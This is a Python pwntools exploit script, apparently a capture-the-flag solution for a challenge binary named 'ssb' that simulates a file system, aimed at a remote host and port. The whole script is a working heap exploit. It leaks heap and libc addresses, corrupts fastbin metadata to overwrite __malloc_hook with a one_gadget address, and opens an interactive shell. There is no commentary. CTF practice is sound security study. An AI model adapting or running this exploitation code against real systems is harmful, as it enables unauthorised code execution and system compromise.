#!/usr/bin/env python
from pwn import *

def list_dir():
    s.sendlineafter('> ', '1')
    files = []
    while True:
        res = s.recvline(False)
        if res == '':
            break
        files.append(res)
    return files

def add_file(name, size=1, content='A\n'):
    s.sendlineafter('> ', '2')
    s.sendlineafter('name: ', name)
    s.sendlineafter('size: ', str(size))
    s.send(content)

def add_dir(name):
    s.sendlineafter('> ', '3')
    s.sendlineafter('name: ', name)

def show_file(name):
    s.sendlineafter('> ', '4')
    s.sendlineafter('name: ', name)

def chdir(name):
    s.sendlineafter('> ', '5')
    s.sendlineafter('name: ', name)

def remove_file(name):
    s.sendlineafter('> ', '6')
    s.sendlineafter('name: ', name)

def replace(x, y):
    for i in range(6):
        replace_byte(x >> 8 * i & 0xff, y >> 8 * i & 0xff)

def replace_byte(x, y):
    if x == y:
        return
    x = str(x)
    y = str(y)
    chdir('2')
    remove_file(x)
    chdir('..')
    chdir('8')
    add_file(x)
    chdir('..')
    for d in '3458':
        chdir(d)
        if y in list_dir():
            remove_file(y)
        chdir('..')
    chdir('2')
    add_file(y)
    chdir('..')

if len(sys.argv) == 1:
    s = process('./ssb', env = {'LD_PRELOAD': './libc-2.27.so'})
else:
    s = remote('34.85.75.40', 31000)

libc = ELF('./libc-2.27.so')

add_file('1')
add_file('2', 0x51)
remove_file('1')
add_file('1', 0x50, 'A' * 0x50 + '\x012\n')
add_dir('3')
add_dir('4')
add_dir('5')
add_file('6', 0x500)
add_file('7', 0x51)
add_dir('8')
index = 9
for d in '345':
    chdir(d)
    for _ in range(0x58):
        if index < 0x100:
            add_file(str(index))
            index += 1
    chdir('..')
chdir('2')
res = list_dir()

heap_addr = 0
for i in range(6):
    heap_addr += int(res[i + 1]) * 0x100 ** i
log.info('heap address: %#x' % heap_addr)
chdir('..')

replace(heap_addr, heap_addr + 0x60)
remove_file('1')
add_file('1', 0x50, 'A' * 0x50 + '\x022\n')
remove_file('6')
show_file('2')

libc_base = u64(s.recvline(False).ljust(8, '\0')) - 0x3ebca0
log.info('libc base: %#x' % libc_base)

add_file('6', 0x67)
remove_file('1')
remove_file('2')
remove_file('6')
add_file('1', 0x67, p64(libc_base + libc.symbols['__malloc_hook'] - 0x13))
add_file('2', 0x67)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
add_file('6', 0x67, 'A' * 0x13 + p64(libc_base + one_gadgets[1]))
remove_file('1')
add_file('1', 0x51)

s.interactive()
